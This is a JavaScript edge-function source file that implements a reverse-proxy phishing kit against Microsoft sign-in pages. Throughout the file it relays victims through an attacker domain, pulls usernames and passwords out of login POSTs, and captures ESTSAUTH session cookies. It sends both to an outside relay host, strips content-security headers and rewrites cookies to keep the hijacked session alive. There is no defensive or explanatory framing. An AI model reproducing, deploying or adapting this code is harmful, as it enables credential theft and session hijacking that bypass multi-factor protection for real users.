export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// Critical auth cookies that must be present for session to work
const CRITICAL_AUTH_COOKIES = ['ESTSAUTH', 'ESTSAUTHPERSISTENT'];

// All auth cookies to check for exfiltration
const AUTH_TOKEN_NAMES = [
  'ESTSAUTH',
  'ESTSAUTHPERSISTENT', 
  'ESTSAUTHLIGHT',
  'SignInStateCookie',
  'esctx',  // This is critical for KMSI!
  'CCState',
  'buid',
  'fpc'
];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' }
};

// ==================== UTILITIES ====================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  
  while (params.has('path')) {
    params.delete('path');
  }
  
  for (const [key, value] of params) {
    if (!value || value === 'undefined' || value === 'null') {
      params.delete(key);
    }
  }
  
  const result = params.toString();
  return result ? '?' + result : '';
}

function isOurDomain(domain) {
  if (!domain) return false;
  return domain === YOUR_DOMAIN || domain.endsWith('.' + YOUR_DOMAIN);
}

// ==================== SIMPLE URL PARSER ====================

function parseUrl(pathname, search) {
  // Simple parsing - just like working script
  let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
  
  // Check for _p/ pattern
  const proxyMatch = path.match(/_p\/([^\/]+)(.*)/);
  
  if (proxyMatch) {
    const domain = proxyMatch[1];
    const remainingPath = proxyMatch[2] || '/';
    
    if (!isOurDomain(domain)) {
      return {
        upstream: domain,
        type: IDENTITY_PROVIDERS[domain]?.type || 'microsoft',
        path: remainingPath,
        search: cleanQueryString(search),
        isProxied: true
      };
    }
  }
  
  // Default to Microsoft login
  return {
    upstream: 'login.microsoftonline.com',
    type: 'microsoft',
    path: pathname,
    search: cleanQueryString(search),
    isProxied: false
  };
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  return !!IDENTITY_PROVIDERS[hostname] || 
         hostname.includes('microsoft') || 
         hostname.includes('live.com') ||
         hostname.includes('office.com') ||
         hostname.includes('msauth.net');
}

// ==================== SIMPLE LOCATION REWRITING ====================

function rewriteLocation(location, currentUpstream) {
  try {
    const url = new URL(location);
    
    // If it's already our domain, ensure it has the proxy prefix
    if (isOurDomain(url.hostname)) {
      if (!url.pathname.startsWith('/_p/')) {
        return `https://${YOUR_DOMAIN}/_p/${currentUpstream}${url.pathname}${url.search}`;
      }
      return location;
    }
    
    // Proxy external domains
    if (shouldProxyDomain(url.hostname)) {
      return `https://${YOUR_DOMAIN}/_p/${url.hostname}${url.pathname}${url.search}`;
    }
    
    return location;
  } catch (e) {
    // Handle relative URLs
    if (location.startsWith('/')) {
      return `https://${YOUR_DOMAIN}/_p/${currentUpstream}${location}`;
    }
    return location;
  }
}

// ==================== AUTH DETECTION ====================

function hasCompleteAuthSession(cookieStr) {
  if (!cookieStr) return false;
  const hasESTSAUTH = cookieStr.toLowerCase().includes('estsauth');
  const hasESTSAUTHPERSISTENT = cookieStr.toLowerCase().includes('estsauthpersistent');
  return hasESTSAUTH && hasESTSAUTHPERSISTENT;
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    // Try JSON
    const jsonData = JSON.parse(bodyText);
    user = jsonData.username || jsonData.email || jsonData.user || jsonData.login;
    pass = jsonData.password || jsonData.passwd || jsonData.pwd;
    if (user && pass) return { user, pass };
  } catch (e) {}
  
  // Try form data (Microsoft login)
  const params = new URLSearchParams(bodyText);
  user = params.get('login') || params.get('loginfmt') || params.get('username');
  pass = params.get('passwd') || params.get('password');
  
  if (user && pass) {
    user = decodeURIComponent(user.replace(/\+/g, ' '));
    pass = decodeURIComponent(pass.replace(/\+/g, ' '));
  }
  
  return { user, pass };
}

// ==================== SIMPLE COOKIE HANDLING - MATCHES WORKING SCRIPT ====================

function processCookies(cookies, upstreamDomain, requestHostname) {
  const modifiedCookies = [];
  
  for (const cookie of cookies) {
    // SIMPLE replacement - exactly like working Cloudflare script
    let modifiedCookie = cookie;
    
    // Replace domain in cookie
    modifiedCookie = modifiedCookie.replace(
      new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'), 
      requestHostname
    );
    
    // Also handle cookies with leading dot
    modifiedCookie = modifiedCookie.replace(
      new RegExp('\\.' + upstreamDomain.replace(/\./g, '\\.'), 'g'), 
      '.' + requestHostname
    );
    
    modifiedCookies.push(modifiedCookie);
  }
  
  return modifiedCookies;
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = parseUrl(url.pathname, url.search);
  const upstreamUrl = `https://${info.upstream}${info.path}${info.search}`;
  
  console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  // Prepare request headers - SIMPLE like working script
  const headers = new Headers();
  
  // Copy essential client headers
  const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin'];
  for (const h of clientHeaders) {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  }

  // Set required headers
  headers.set('Host', info.upstream);
  headers.set('Referer', `https://${url.hostname}/`);
  headers.set('Origin', `https://${info.upstream}`);

  // Remove problematic headers
  const removeHeaders = ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
                         'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for'];
  for (const h of removeHeaders) {
    headers.delete(h);
  }

  let requestBody = null;

  // Handle POST requests for credentials
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] Captured credentials for ${info.type}`);
        await sendToVercel('credentials', { 
          type: 'creds', ip, user, pass, platform: info.type, url: url.href 
        });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const resp = await fetch(upstreamUrl, {
      method: request.method,
      headers: headers,
      body: requestBody,
      redirect: 'manual'
    });

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const location = resp.headers.get('Location');
      if (location) {
        const rewrittenLocation = rewriteLocation(location, info.upstream);
        console.log(`[REDIRECT] ${location} -> ${rewrittenLocation}`);
        
        const redirectHeaders = new Headers();
        redirectHeaders.set('location', rewrittenLocation);
        redirectHeaders.set('access-control-allow-origin', '*');
        redirectHeaders.set('access-control-allow-credentials', 'true');
        
        return new Response(null, { status: resp.status, headers: redirectHeaders });
      }
    }

    // Get cookies from response
    const cookies = resp.headers.getSetCookie?.() || [];
    let cookieStr = cookies.join('; \n\n');
    
    // Check for complete session
    const hasCompleteSession = hasCompleteAuthSession(cookieStr);
    
    if (hasCompleteSession) {
      console.log(`[EXFIL] Complete session captured!`);
      await exfiltrateCookies(cookieStr, ip, info.type, url.href);
    }

    // Process cookies for browser - SIMPLE replacement
    const modifiedCookies = processCookies(cookies, info.upstream, url.hostname);

    // Build response headers
    const responseHeaders = new Headers();
    
    // Copy important headers
    const copyHeaders = ['content-type', 'content-length', 'content-encoding', 'cache-control', 'expires', 'etag', 'last-modified', 'vary'];
    for (const name of copyHeaders) {
      const value = resp.headers.get(name);
      if (value) responseHeaders.set(name, value);
    }
    
    // Remove security headers
    responseHeaders.delete('content-security-policy');
    responseHeaders.delete('content-security-policy-report-only');
    responseHeaders.delete('clear-site-data');
    
    // Add CORS headers
    responseHeaders.set('access-control-allow-origin', '*');
    responseHeaders.set('access-control-allow-credentials', 'true');
    
    // Add modified cookies
    for (const cookie of modifiedCookies) {
      responseHeaders.append('set-cookie', cookie);
    }

    // Process response body - SIMPLE replacement
    const contentType = resp.headers.get('content-type') || '';
    
    if (contentType.includes('text/html') || contentType.includes('application/javascript') || 
        contentType.includes('application/json') || contentType.includes('text/css')) {
      
      let text = await resp.text();
      
      // Simple domain replacement
      for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
        const regex = new RegExp(domain.replace(/\./g, '\\.'), 'g');
        text = text.replace(regex, `${YOUR_DOMAIN}/_p/${domain}`);
      }
      
      return new Response(text, { status: resp.status, headers: responseHeaders });
    }

    // Return response as-is for other content types
    return new Response(resp.body, { status: resp.status, headers: responseHeaders });

  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }), 
      { status: 502, headers: { 'content-type': 'application/json' } }
    );
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
